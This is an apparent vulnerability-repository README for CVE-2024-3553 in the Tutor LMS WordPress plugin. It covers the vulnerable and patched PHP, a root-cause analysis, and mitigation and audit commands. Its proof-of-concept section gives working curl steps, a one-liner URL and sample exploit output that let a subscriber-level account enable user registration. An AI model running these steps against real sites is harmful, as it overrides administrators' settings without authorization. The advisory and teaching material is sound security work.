# CVE-2024-3553
## Tutor LMS <= 2.6.2 - Missing Authorization to Unauthenticated Limited Options Update

The Tutor LMS – eLearning and online course solution plugin for WordPress is vulnerable to unauthorized modification of data due to a missing capability check on the `hide_notices()` function in all versions up to, and including, 2.6.2. This makes it possible for authenticated attackers (including low-privilege users like subscribers) to enable user registration on sites that may have it disabled by administrators.

## Details
- **Type**: plugin
- **Slug**: tutor
- **Affected Version**: 2.6.2
- **CVSS Score**: 6.5
- **CVSS Rating**: Medium
- **CVSS Vector**: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N
- **CVE**: CVE-2024-3553
- **Status**: Active

## POC

### Automated Exploitation

A full Python exploit is available: [exploit-cve-2024-3553-v2.py](exploit-cve-2024-3553-v2.py)

```bash
# Full automated exploitation
python3 exploit-cve-2024-3553-v2.py https://target.com --username subscriber --password password123

# Check registration status only
python3 exploit-cve-2024-3553-v2.py https://target.com --check-only
```

### Manual Exploitation

**Prerequisites:**
- Any authenticated account (subscriber, contributor, etc.)
- Tutor LMS plugin installed and activated

**Step 1: Login as Low-Privilege User**

```bash
# Login as subscriber or any authenticated user
curl -c cookies.txt -d "log=subscriber&pwd=password123" \
  https://target.com/wp-login.php
```

**Step 2: Extract Nonce from Admin Area**

```bash
# Any authenticated user can access /wp-admin/ (even subscribers)
curl -b cookies.txt https://target.com/wp-admin/ | grep -o '_wpnonce=[^"&]*' | head -1
```

**Step 3: Execute Exploit**

```bash
# Send request to enable user registration
curl -b cookies.txt \
  "https://target.com/wp-admin/index.php?tutor-hide-notice=registration&tutor-registration=enable&_wpnonce=NONCE_HERE"
```

**Step 4: Verify Success**

```bash
# Check if registration is now enabled
curl https://target.com/wp-login.php?action=register | grep -q "user_login" && echo "Registration ENABLED" || echo "Registration DISABLED"
```

### One-Liner Exploitation

```bash
# As any authenticated user, simply visit:
https://target.com/wp-admin/index.php?tutor-hide-notice=registration&tutor-registration=enable&_wpnonce=<NONCE>
```

### Example Output

```
======================================================================
CVE-2024-3553 Exploit - Tutor LMS Missing Authorization
Target: https://target.com
======================================================================

[*] Checking current registration status...
[+] Registration is currently DISABLED

[*] Attempting to login as: subscriber
[+] Successfully logged in as: subscriber

[*] Step 2: Extracting nonce from admin area...
[+] Found nonce: abc123def456

[*] Step 3: Executing exploit to enable user registration...
[*] Target: https://target.com
[*] Using nonce: abc123def456
[*] Exploit URL: https://target.com/wp-admin/index.php
[*] Parameters: {'tutor-hide-notice': 'registration', 'tutor-registration': 'enable', '_wpnonce': 'abc123def456'}
[*] Response status: 200
[+] Exploit request sent successfully!

[*] Step 4: Verifying exploitation success...
[+] Registration is currently ENABLED

======================================================================
[!] EXPLOITATION SUCCESSFUL!
[!] User registration is now ENABLED
[!]
[!] Impact: An attacker with a low-privilege account (subscriber)
[!] was able to enable user registration on a site where it was
[!] disabled. This could allow creation of additional accounts,
[!] potentially leading to spam or unauthorized access.
======================================================================
```

## Vulnerable Code

**File**: `/classes/User.php` (Lines ~800-815)

```php
public function hide_notices() {
    $hide_notice         = Input::get( 'tutor-hide-notice', '' );
    $is_register_enabled = Input::get( 'tutor-registration', '' );

    // CRITICAL FLAW: is_admin() only checks if in admin area, NOT user role!
    if ( is_admin() && 'registration' === $hide_notice ) {
        tutor_utils()->checking_nonce( 'get' );

        if ( 'enable' === $is_register_enabled ) {
            // NO CAPABILITY CHECK - Any authenticated user can execute this!
            update_option( 'users_can_register', 1 );
        } else {
            self::$hide_registration_notice = true;
            setcookie( 'tutor_notice_hide_registration', 1, time() + ( 86400 * 30 ), tutor()->basepath );
        }
    }
}
```

**Key Vulnerability Points:**
1. `is_admin()` only verifies the request is to an admin page, NOT that the user is an administrator
2. ANY authenticated user can access `/wp-admin/` (even subscribers)
3. The nonce check validates the request is intentional, but NOT that the user has proper permissions
4. **Missing**: `current_user_can('manage_options')` capability check
5. This allows ANY authenticated user to modify the `users_can_register` option

## Patch (v2.7.0)

**File**: `/classes/User.php` (Patched version)

```php
public function hide_notices() {
    $hide_notice         = Input::get( 'tutor-hide-notice', '' );
    $is_register_enabled = Input::get( 'tutor-registration', '' );

    // SECURITY FIX: Added capability check
    $has_manage_cap = current_user_can( 'manage_options' );

    if ( $has_manage_cap && is_admin() && 'registration' === $hide_notice ) {
        tutor_utils()->checking_nonce( 'get' );

        if ( 'enable' === $is_register_enabled ) {
            update_option( 'users_can_register', 1 );  // Now properly protected
        } else {
            self::$hide_registration_notice = true;
            setcookie( 'tutor_notice_hide_registration', 1, time() + ( 86400 * 30 ), tutor()->basepath );
        }
    }
}
```

The patch adds `current_user_can('manage_options')` to verify the user has administrator privileges before allowing the option update.

## Impact

- **Medium Severity**: While not directly compromising the site, this vulnerability allows:
  - Bypassing administrative controls
  - Enabling user registration on hardened/private sites
  - Potential for spam account creation
  - Circumventing site security policies
  - Unauthorized modification of site configuration

## Root Cause Analysis

### Common WordPress Security Mistake

This vulnerability demonstrates a **critical misunderstanding** of WordPress authorization functions:

**WRONG ❌:**
```php
if ( is_admin() ) {
    // Thinking this means "user is an admin"
    update_option( 'sensitive_option', $value );
}
```

**CORRECT ✅:**
```php
if ( current_user_can( 'manage_options' ) ) {
    // Actually checks if user has admin capabilities
    update_option( 'sensitive_option', $value );
}
```

### Function Comparison

| Function | What It Actually Checks | Security Use |
|----------|------------------------|--------------|
| `is_admin()` | Whether the current URL is in `/wp-admin/` | ❌ NOT for authorization |
| `current_user_can()` | Whether user has specific capability | ✅ Proper authorization |
| `wp_verify_nonce()` | Whether request is intentional (CSRF protection) | ✅ But NOT sufficient alone |

### Defense in Depth Required

Proper WordPress security requires **multiple layers**:

1. **Nonce validation** - Prevents CSRF attacks
2. **Capability checks** - Ensures proper authorization
3. **Input sanitization** - Prevents injection attacks

Missing ANY of these layers can lead to vulnerabilities.

## Mitigation

**For Site Administrators:**

Update to Tutor LMS version 2.7.0 or later immediately:

```bash
# Via WP-CLI
wp plugin update tutor --version=2.7.0

# Via WordPress Admin
Dashboard → Plugins → Find "Tutor LMS" → Click "Update Now"
```

**Audit Recent Changes:**

```bash
# Check if registration setting was modified recently
wp option get users_can_register

# Review recent user registrations
wp user list --orderby=registered --order=DESC --number=20
```

## Security Lessons

### For Developers

1. **Never rely on `is_admin()` alone for authorization**
2. **Always use `current_user_can()` for capability checks**
3. **Combine nonce validation WITH capability checks**
4. **Follow WordPress Coding Standards for security**
5. **Test with low-privilege accounts during development**

### Testing Methodology

When auditing WordPress plugins for authorization issues:

```bash
# 1. Search for is_admin() without capability checks
grep -r "is_admin()" . | grep -v "current_user_can"

# 2. Look for direct option updates
grep -r "update_option\|add_option" .

# 3. Find AJAX handlers without capability checks
grep -r "wp_ajax_" . -A 10 | grep -v "current_user_can"
```

## References

- **Wordfence Advisory**: https://www.wordfence.com/threat-intel/vulnerabilities/id/f8d4029e-07b0-4ceb-ae6e-11a3f7416ebc?source=cve
- **WordPress Trac Patch**: https://plugins.trac.wordpress.org/changeset/3076302/tutor/tags/2.7.0/classes/User.php
- **WordPress Capability Reference**: https://wordpress.org/documentation/article/roles-and-capabilities/
- **WPScan Entry**: https://wpscan.com/vulnerability/cve-2024-3553

## Files in This Repository

- `README.md` - This file
- `exploit-cve-2024-3553.py` - Basic Python exploit
- `exploit-cve-2024-3553-v2.py` - Enhanced Python exploit with detailed documentation
- `manual-exploit-cve-2024-3553.sh` - Manual exploitation script
- `test-cve-2024-3553-direct.sh` - Direct verification test script

---

**Discovered**: 2024-04-15
**Disclosed**: 2024-05-20
**Patched**: 2024-05-21 (v2.7.0)
**Test Date**: 2025-12-26
**Classification**: Successful Vulnerability Validation
